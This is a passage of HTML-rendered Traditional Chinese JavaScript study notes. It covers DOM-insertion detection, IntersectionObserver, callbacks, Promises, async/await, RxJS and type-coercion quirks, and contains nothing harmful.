href=\"https://developer.mozilla.org/en-US/docs/Web/Guide/Events/Mutation_events\">Mutation events API</a>，由於它在每次 DOM 變化都會被調用，同樣導致效能問題，目前 <code>MutationEvents</code> API 已經被棄用。</p>\n<p>CSS animations：這是個有些特怪異的方案，基本上的概念是一個有 CSS 動畫的元素加進 DOM 中時，動畫開始就會觸發 animationstart 事件，當我們再對這個事件加上 handler，就能掌握元素加進 DOM 中的確切時間。</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>container-element<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-css\"><code class=\"language-css\"><span class=\"token atrule\"><span class=\"token rule\">@keyframes</span> nodeInserted</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token selector\">from</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">opacity</span><span class=\"token punctuation\">:</span> 0.99<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token selector\">to</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">opacity</span><span class=\"token punctuation\">:</span> 1<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">#container-element *</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">animation-duration</span><span class=\"token punctuation\">:</span> 0.001s<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">animation-name</span><span class=\"token punctuation\">:</span> nodeInserted<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><p>需要先檢查 <code>event.animationName</code> 是否是我們所想要的動畫。</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> <span class=\"token function-variable function\">insertionListener</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">event</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// Making sure that this is the animation we want.</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>event<span class=\"token punctuation\">.</span>animationName <span class=\"token operator\">===</span> <span class=\"token string\">\"nodeInserted\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Node has been inserted: \"</span> <span class=\"token operator\">+</span> event<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\ndocument<span class=\"token punctuation\">.</span><span class=\"token function\">addEventListener</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"animationstart\"</span><span class=\"token punctuation\">,</span> insertionListener<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// standard + firefox</span>\ndocument<span class=\"token punctuation\">.</span><span class=\"token function\">addEventListener</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"MSAnimationStart\"</span><span class=\"token punctuation\">,</span> insertionListener<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// IE</span>\ndocument<span class=\"token punctuation\">.</span><span class=\"token function\">addEventListener</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"webkitAnimationStart\"</span><span class=\"token punctuation\">,</span> insertionListener<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Chrome + Safari</span></code></pre><p><code>MutationObserver</code> 相較這些方案提供了更多優勢，包括它涵蓋了 DOM 中的每種可能變化，以及分段啟動的特性，讓它有更好的效能，並且擁有相當優秀的支援性。</p>\n<h3 id=\"intersectionobserver\">IntersectionObserver</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/osublake/embed/6fd214ecd74e7091ec7b609bb0270f97?height=450&amp;slug-hash=6fd214ecd74e7091ec7b609bb0270f97&amp;user=osublake&amp;tab-bar-color=%23222&amp;name=cp_embed_2#result-box\">example</a></li>\n</ul>\n<h4 id=\"簡介-1\">簡介</h4>\n<p><code>IntersectionObserver</code> 會在指定的目標出現在觀察器 (window) 中時，才回傳 <code>true</code>，\n不同於 jQuery 的 <code>onscroll</code> 是在每次捲動時都執行一次監聽。</p>\n<h4 id=\"使用-1\">使用</h4>\n<p><code>let observer = new IntersectionObserver(callback, [option]);</code></p>\n<ul>\n<li><code>callback</code>: 要執行的動作函式</li>\n</ul>\n<p>callback 預設的傳入參數為一陣列</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token punctuation\">[</span>\n  <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 唯讀變數，目標元素的矩形節點的資訊 (ID、座標、長寬)</span>\n    boundingClientRect<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token comment\">// 目標元素的出現比例</span>\n    intersectionRation<span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n    <span class=\"token comment\">// 唯讀變數，目標元素與觀察器的相交區域</span>\n    intersectionRect<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token comment\">// 是否出現於觀察器中</span>\n    isIntersecting<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n    <span class=\"token comment\">// 觀察器的資訊</span>\n    rootBounds<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token comment\">// 目標</span>\n    target<span class=\"token operator\">:</span> 目標的 <span class=\"token constant\">DOM</span> 節點\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li><code>option</code>: 有三個參數可調整</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token punctuation\">{</span>\n  root<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n  rootMargin<span class=\"token operator\">:</span> <span class=\"token string\">\"0px 0px 0px 0px\"</span><span class=\"token punctuation\">,</span>\n  threshold<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span></code></pre><p><code>root</code>: 可指定某個特定的 element 做為觀察器: <code>root: documnet.getElementById(&#39;container&#39;)</code>，預設值為 <code>null</code>，即目前觀看中的視窗。\n<code>rootMargin</code>: 四個值依序為上、右、下、左，可放大或縮小的觀察器的範圍，預設值為 <code>&quot;0px 0px 0px 0px&quot;</code>。\n<code>threshold</code>: 指定目標出現於觀察器內的百分比，到達該值後才執行 callback，可指定多個值如: <code>[0, 0.25, 0.5, 0.75, 1]</code> 會在目標出現 0%、25%、50%、75%、100% 的時候都執行一次 callback 函式，預設值為 <code>[0]</code>，即目標接觸到觀察器的邊緣便觸發 callback 函式。</p>\n<p><code>observer.observe(el)</code>\n<code>observer.unobserve(el)</code>\n<code>observer.disconnect()</code></p>\n<h2 id=\"非同步處理\">非同步處理</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/G-awa/items/652107a9abf7ff6d0d06\">【初心者向け】JavaScript の非同期処理を理解する　 callback、Promise そして async/await へ - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://developers.google.com/web/fundamentals/primers/promises?hl=zh-tw\">JavaScript Promise：簡介  |  Web  |  Google Developers</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/frochu/%E5%88%A5%E9%80%99%E6%A8%A3%E4%BD%BF%E7%94%A8promise-d4f5a731adb4\">別這樣使用 Promise</a></li>\n</ul>\n<h3 id=\"callback\">Callback</h3>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">addAsync</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">num1<span class=\"token punctuation\">,</span> num2<span class=\"token punctuation\">,</span> callback</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> $<span class=\"token punctuation\">.</span><span class=\"token function\">getJSON</span><span class=\"token punctuation\">(</span>\n    <span class=\"token string\">\"https://example.com\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">{</span>\n      num1<span class=\"token operator\">:</span> num1<span class=\"token punctuation\">,</span>\n      num2<span class=\"token operator\">:</span> num2<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    callback\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">addAsync</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">success</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> success<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li>多次呼叫會造成語法內嵌，出現 callback hell</li>\n</ul>\n<h3 id=\"promises\">Promises</h3>\n<ul>\n<li><code>Promise</code> 有三種狀態：\n<br>├ 1. <code>pending</code>: 等待\n<br>├ 2. <code>resolved</code>: 成功\n<br>└ 3. <code>rejected</code>: 失敗</li>\n<li><code>new Promise(function (resolve, reject) {})</code></li>\n<li>Promise 執行成功後需在內部 function 呼叫 (撰寫) <code>resolve(成功結果)</code>，失敗則呼叫 <code>reject(失敗結果)</code></li>\n<li>可以在 <code>Promise</code> 後方接上 <code>.then</code> 或 <code>.catch</code> 執行對應行為，<code>.then</code> 的參數為從 <code>resolve(成功結果)</code> 傳來的結果，<code>.catch</code> 的參數則是從 <code>reject(失敗結果)</code> 傳來。</li>\n<li>可解決 callback hell 問題</li>\n</ul>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">promiseFn</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">num<span class=\"token punctuation\">,</span> time <span class=\"token operator\">=</span> <span class=\"token number\">500</span></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n      num <span class=\"token operator\">?</span> <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>num<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">, 成功</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"失敗\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">promiseFn</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">promiseFn</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"async--await\">Async / Await</h3>\n<ul>\n<li>於 ES7 新增</li>\n<li>欲使一 function 回傳 Promise，需於該 function 前加上 <code>async</code></li>\n<li>使用 Promise 或 function 回傳的 Promise 時需使用 <code>await</code>\n<br>└ 如 <code>let phone = await willGetNewPhone</code> 或 <code>let message = await showOff(phone)</code></li>\n<li>可於函式內使用 <code>try {} catch (error) {}</code> 攔截例外</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">getData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> data1 <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">promiseFn</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> data2 <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">promiseFn</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">,</span> data2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">getData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"rxjs-observables\">RxJS (Observables)</h3>\n<ul>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.techbridge.cc/2017/12/08/rxjs/\">希望是最淺顯易懂的 RxJS 教學</a></p>\n</li>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.jerry-hong.com/series/rxjs\">30 天精通 RxJS</a></p>\n</li>\n<li><p>可以被取消</p>\n</li>\n<li><p>需要時才執行</p>\n</li>\n</ul>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> Observable <span class=\"token operator\">=</span> Rx<span class=\"token punctuation\">.</span>Observable<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> resultA<span class=\"token punctuation\">,</span> resultB<span class=\"token punctuation\">,</span> resultC<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">addAsync</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">num1<span class=\"token punctuation\">,</span> num2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> promise <span class=\"token operator\">=</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>\n    <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">http://example.com?num1=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>num1<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">&amp;num2=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>num2<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> x<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> Observable<span class=\"token punctuation\">.</span><span class=\"token function\">fromPromise</span><span class=\"token punctuation\">(</span>promise<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">addAsync</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">do</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span>resultA <span class=\"token operator\">=</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">flatMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">addAsync</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">do</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span>resultB <span class=\"token operator\">=</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">flatMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">addAsync</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">do</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span>resultC <span class=\"token operator\">=</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">subscribe</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"total\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>resultA<span class=\"token punctuation\">,</span> resultB<span class=\"token punctuation\">,</span> resultC<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li><code>Observable.fromPromise</code> 會將 Promise 轉換成 observable stream。</li>\n<li><code>.do</code> 和 .<code>flatMap</code> 是 Observable 的運算子。</li>\n</ul>\n<h2 id=\"import\">Import</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://wcc723.github.io/development/2020/03/25/import-export/\">完全解析 JavaScript import、export | 卡斯伯 Blog - 前端，沒有極限</a></li>\n</ul>\n<h2 id=\"whats-this-in-javascript-\">What&#39;s THIS in JavaScript ?</h2>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://kuro.tw/posts/2017/10/12/What-is-THIS-in-JavaScript-%E4%B8%8A/\">What&#39;s THIS in JavaScript ? [上]</a></p>\n<h2 id=\"小技巧\">小技巧</h2>\n<h3 id=\"強制轉換資料型別\">強制轉換資料型別</h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">Math<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 3;</span>\nMath<span class=\"token punctuation\">.</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1;</span>\nMath<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true;</span>\nMath<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false</span>\nMath<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// -Infinity;</span>\nMath<span class=\"token punctuation\">.</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Infinity;</span>\n\n<span class=\"token number\">0.1</span> <span class=\"token operator\">+</span> <span class=\"token number\">0.1</span> <span class=\"token operator\">+</span> <span class=\"token number\">0.1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 0.30000000000000004;</span>\n\n<span class=\"token boolean\">true</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true;</span>\n<span class=\"token boolean\">true</span> <span class=\"token operator\">+</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 2;</span>\n<span class=\"token boolean\">true</span> <span class=\"token operator\">+</span> <span class=\"token boolean\">true</span> <span class=\"token operator\">===</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true;</span>\n<span class=\"token boolean\">true</span> <span class=\"token operator\">===</span> <span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false;</span>\n<span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1;</span>\n<span class=\"token boolean\">true</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true;</span>\n<span class=\"token boolean\">true</span> <span class=\"token operator\">===</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false;</span>\n\n<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"\"</span>\n<span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">+</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"[object Object][object Object]\"</span>\n<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"[object Object]\"</span>\n<span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 0</span>\n<span class=\"token number\">1</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"1\"</span>\n<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"1\"</span>\n<span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">+</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 0</span>\n\n<span class=\"token string\">\"5\"</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"53\";</span>\n<span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"5\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"35\";</span>\n<span class=\"token string\">\"0\"</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"031\";</span>\n<span class=\"token string\">\"0\"</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"04\";</span>\n<span class=\"token string\">\"5\"</span> <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 2;</span>\n<span class=\"token string\">\"5\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 15</span>\n<span class=\"token string\">\"15\"</span> <span class=\"token operator\">/</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 5</span>\n<span class=\"token string\">\"5\"</span> <span class=\"token operator\">===</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false</span>\n<span class=\"token string\">\"5\"</span> <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n<span class=\"token operator\">+</span><span class=\"token string\">\"5\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 5</span>\n<span class=\"token operator\">-</span><span class=\"token string\">\"123\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// -123;</span>\n\n<span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token function\">Array</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">_<span class=\"token punctuation\">,</span> i</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [ 0, 1, 2, 3, 4 ]</span></code></pre><h3 id=\"4-個-request-的方法\">4 個 request 的方法</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/doriven/items/503fdc6de9bc0e725334\">Native な JavaScript で Fetch API を利用し Ajax を行う</a></li>\n<li><a 